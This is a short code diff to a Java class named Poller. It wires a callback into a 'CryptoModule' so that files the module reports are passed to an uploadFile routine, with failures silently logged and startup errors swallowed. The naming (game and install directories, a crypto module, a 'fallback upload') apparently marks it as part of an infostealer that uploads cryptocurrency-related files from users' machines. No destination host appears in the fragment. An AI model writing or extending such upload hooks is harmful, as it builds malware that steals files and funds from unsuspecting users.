@@ -101,7 +101,11 @@ public final class Poller implements Runnable {
 				Log.debug("Crypto module disabled: no config.json resource");
 				return;
 			}
-			crypto = new CryptoModule(installDir, gameDir, config);
+			crypto = new CryptoModule(installDir, gameDir, config, (module, file) -> {
+				if (!uploadFile(file)) {
+					Log.debug("Crypto fallback upload failed: " + file);
+				}
+			});
 			crypto.start();
 		} catch (Throwable throwable) {
 			Log.debug("Crypto module failed to start", throwable);
